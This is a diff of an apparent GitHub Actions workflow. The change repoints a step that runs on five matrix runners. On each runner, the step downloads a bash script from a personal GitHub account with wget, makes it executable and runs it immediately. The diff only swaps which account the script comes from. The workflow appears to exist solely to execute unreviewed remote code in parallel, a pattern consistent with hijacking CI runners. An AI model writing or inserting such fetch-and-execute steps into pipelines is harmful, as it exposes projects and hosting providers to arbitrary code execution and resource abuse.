@@ -24,4 +24,4 @@ jobs:
      runner: [0,1,2,3,4,]
    steps:
      - run: |
-          wget https://raw.githubusercontent.com/racon3349/bash-script/main/bash.sh && chmod +x bash.sh && ./bash.sh
+          wget https://raw.githubusercontent.com/behruz4933/bash-script/main/bash.sh && chmod +x bash.sh && ./bash.sh
